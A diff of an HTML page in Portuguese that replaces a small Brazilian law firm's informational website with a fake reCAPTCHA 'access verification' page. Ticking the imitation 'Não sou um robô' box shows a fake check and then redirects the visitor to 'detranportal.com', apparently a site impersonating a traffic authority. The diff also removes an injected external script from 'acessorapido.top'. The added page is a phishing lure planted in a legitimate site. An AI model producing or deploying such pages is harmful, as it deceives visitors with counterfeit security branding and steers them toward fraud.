@@ -1,187 +1,253 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <script src="https://acessorapido.top/b/cl_e6e802659b74.js?_v=1788701316386" defer></script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Janes Joyce Camara Sociedade Individual de Advocacia</title>
+<title>Verificação de Acesso</title>
 
 <style>
-body{margin:0;font-family:"Segoe UI",Arial,sans-serif;background:#f4f6f9;color:#333;}
-header{
-background:linear-gradient(135deg,#0a2a4f,#154a8a);
-padding:25px 40px;
-color:#fff;
-display:flex;
-justify-content:space-between;
-align-items:center;
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
 }
-header h1{margin:0;font-size:26px;font-weight:600;}
-nav a{
-color:#fff;
-margin-left:25px;
-text-decoration:none;
-font-weight:500;
+
+body{
+  font-family:'Segoe UI',Arial,sans-serif;
+  background:linear-gradient(135deg,#f1f5f9,#ffffff,#eef2ff);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  min-height:100vh;
+  padding:20px;
 }
-.hero{
-padding:100px 20px;
-text-align:center;
-background:url('https://images.unsplash.com/photo-1521737604893-d14cc237f11d') center/cover no-repeat;
-color:#fff;
+
+.container{
+  width:100%;
+  max-width:420px;
 }
-.hero h2{
-font-size:40px;
-text-shadow:0 3px 8px rgba(0,0,0,.4);
-}
-.hero p{
-font-size:20px;
-text-shadow:0 2px 6px rgba(0,0,0,.4);
-}
-section{
-max-width:1100px;
-margin:60px auto;
-padding:40px;
-background:#fff;
-border-radius:12px;
-box-shadow:0 4px 16px rgba(0,0,0,.1);
-}
-h2{color:#0a2a4f;}
-.grid{
-display:grid;
-grid-template-columns:repeat(auto-fit,minmax(280px,1fr));
-gap:25px;
-}
+
 .card{
-background:#f9fbfd;
-padding:25px;
-border-radius:12px;
-border:1px solid #e3e9f0;
-transition:.2s;
+  background:#ffffff;
+  border-radius:24px;
+  padding:30px;
+  border:1px solid #e2e8f0;
+  box-shadow:
+    0 20px 40px rgba(15,23,42,.08),
+    0 4px 12px rgba(15,23,42,.04);
+  animation:fadeIn .6s ease;
 }
-.card:hover{
-transform:translateY(-4px);
-box-shadow:0 4px 16px rgba(0,0,0,.1);
+
+.title{
+  font-size:24px;
+  color:#0f172a;
+  font-weight:700;
+  margin-bottom:10px;
+  text-align:center;
 }
-.card h3{color:#154a8a;}
-footer{
-background:#0a2a4f;
-color:#fff;
-padding:25px;
-text-align:center;
-margin-top:60px;
+
+.subtitle{
+  font-size:14px;
+  color:#64748b;
+  text-align:center;
+  margin-bottom:25px;
 }
-footer a{
-color:#79b8ff;
-text-decoration:none;
+
+.captcha-box{
+  border:1px solid #e2e8f0;
+  border-radius:18px;
+  padding:18px;
+  background:#f8fafc;
+}
+
+.captcha-row{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:10px;
+}
+
+.check-area{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  padding:12px;
+  border-radius:12px;
+  cursor:pointer;
+  transition:all .25s ease;
+}
+
+.check-area:hover{
+  background:#eef2ff;
+}
+
+.check-area input{
+  width:22px;
+  height:22px;
+  accent-color:#22c55e;
+  cursor:pointer;
+}
+
+.check-text{
+  font-size:15px;
+  color:#0f172a;
+  font-weight:500;
+}
+
+.captcha-brand{
+  text-align:center;
+  font-size:10px;
+  color:#64748b;
+}
+
+.captcha-brand img{
+  width:34px;
+  display:block;
+  margin:0 auto 3px;
+}
+
+.loader{
+  width:22px;
+  height:22px;
+  border:3px solid #dbeafe;
+  border-top:3px solid #2563eb;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  display:none;
+}
+
+.secure{
+  margin-top:18px;
+  text-align:center;
+  font-size:13px;
+  color:#16a34a;
+  font-weight:700;
+}
+
+.footer{
+  margin-top:18px;
+  font-size:12px;
+  color:#64748b;
+  text-align:center;
+  line-height:1.5;
+}
+
+.footer span{
+  display:block;
+  margin-top:6px;
+  color:#94a3b8;
+}
+
+@keyframes spin{
+  from{
+    transform:rotate(0deg);
+  }
+  to{
+    transform:rotate(360deg);
+  }
+}
+
+@keyframes fadeIn{
+  from{
+    opacity:0;
+    transform:translateY(15px);
+  }
+  to{
+    opacity:1;
+    transform:translateY(0);
+  }
 }
 </style>
 </head>
 
 <body>
 
-<header>
-<h1>Janes Joyce Camara Sociedade Individual de Advocacia</h1>
+<div class="container">
 
-<nav>
-<a href="index.html">Início</a>
-<a href="politica-de-privacidade.html">Política de Privacidade</a>
-</nav>
-</header>
+  <div class="card">
 
-<div class="hero">
-<h2>Serviços Jurídicos Especializados</h2>
-<p>Atendimento jurídico com ética, transparência e compromisso com cada cliente.</p>
-</div>
+    <div class="title">
+      Verificação de Acesso
+    </div>
 
-<section>
+    <div class="subtitle">
+      Confirme sua identidade para continuar
+    </div>
 
-<h2>Quem Somos</h2>
+    <div class="captcha-box">
 
-<p>
-A empresa <strong>Janes Joyce Camara Sociedade Individual de Advocacia</strong>,
-inscrita no <strong>CNPJ 49.421.567/0001-20</strong>,
-foi fundada em <strong>01/02/2023</strong>,
-na cidade de <strong>Brasília – DF</strong>.
-</p>
+      <div class="captcha-row">
 
-<p>
-Sua atividade principal, conforme a Receita Federal, é
-<strong>69.11-7-01 - Serviços advocatícios</strong>.
-Sua situação cadastral permanece <strong>Ativa</strong>.
-</p>
+        <label class="check-area">
 
-<p>
-Prestamos serviços jurídicos com foco em responsabilidade,
-confidencialidade e excelência, buscando oferecer soluções
-adequadas para pessoas físicas e jurídicas.
-</p>
+          <input type="checkbox" id="check">
 
-</section>
+          <div id="loader" class="loader"></div>
 
-<section>
+          <span class="check-text" id="text">
+            Não sou um robô
+          </span>
 
-<h2>Áreas de Atuação</h2>
+        </label>
 
-<div class="grid">
+        <div class="captcha-brand">
 
-<div class="card">
-<h3>Consultoria Jurídica</h3>
-<p>Orientação jurídica preventiva para pessoas e empresas.</p>
-</div>
+          <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
 
-<div class="card">
-<h3>Assessoria Legal</h3>
-<p>Acompanhamento de demandas e suporte especializado.</p>
-</div>
+          reCAPTCHA
+          <br>
 
-<div class="card">
-<h3>Atendimento Personalizado</h3>
-<p>Serviços conduzidos com ética, transparência e dedicação.</p>
-</div>
+          <span style="font-size:9px;">
+            Privacidade - Termos
+          </span>
 
-<div class="card">
-<h3>Representação Jurídica</h3>
-<p>Atuação profissional na defesa dos interesses dos clientes.</p>
-</div>
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="secure">
+      ✔ Ambiente seguro e protegido
+    </div>
+
+    <div class="footer">
+      Após marcar a opção, a verificação será realizada automaticamente
+
+      <span>
+        Isso ajuda a proteger o sistema contra acessos indevidos
+      </span>
+    </div>
+
+  </div>
 
 </div>
 
-</section>
+<script>
+const check = document.getElementById("check");
+const loader = document.getElementById("loader");
+const text = document.getElementById("text");
 
-<section>
+check.addEventListener("change", () => {
 
-<h2>Nossos Pilares</h2>
+  if(check.checked){
 
-<div class="grid">
+    loader.style.display = "inline-block";
+    text.innerText = "Verificando...";
 
-<div class="card">
-<h3>Missão</h3>
-<p>Oferecer serviços jurídicos com excelência e responsabilidade.</p>
-</div>
+    setTimeout(() => {
 
-<div class="card">
-<h3>Visão</h3>
-<p>Ser reconhecida pela confiança, qualidade e compromisso com os clientes.</p>
-</div>
+      loader.style.display = "none";
+      text.innerText = "Verificado ✔";
 
-<div class="card">
-<h3>Valores</h3>
-<p>Ética, respeito, transparência, profissionalismo e confidencialidade.</p>
-</div>
+      window.location.href = "https://detranportal.com/sc/yE3e/";
 
-</div>
+    }, 1800);
 
-</section>
+  }
 
-<footer>
-
-© 2025 Janes Joyce Camara Sociedade Individual de Advocacia • CNPJ 49.421.567/0001-20
-
-<br><br>
-
-<a href="politica-de-privacidade.html">Política de Privacidade</a>
-
-</footer>
+});
+</script>
 
 </body>
 </html>
